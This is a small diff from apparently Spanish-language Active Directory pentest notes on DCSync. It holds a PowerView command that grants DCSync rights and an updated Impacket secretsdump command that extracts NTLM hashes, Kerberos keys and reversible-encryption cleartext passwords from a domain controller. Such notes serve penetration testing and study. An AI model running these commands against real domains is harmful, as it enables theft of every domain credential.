@@ -21,7 +21,7 @@ Add-ObjectACL -PrincipalIdentity <user> -Credential $cred -Rights DCSync
 #######Extraer los hashes NTLM y Kerberos Keys usando secretsdump:
 
 ######linux
-secretsdump.py -outputfile <file_a_exportar> -just-dc <dc>/<user>@<dc_ip>
+impacket-secretsdump -outputfile <file_a_exportar> -just-dc <dc>/<user>@<dc_ip>
 esto va a crear 3 archivos: uno con los hashes ntlm, otro con los kerberos y otro con los cleartext para los users que tengan habilitada el "reversible encryption"
 
 Podemos también usar varias flags para extraer datos u objetivos puntuales:
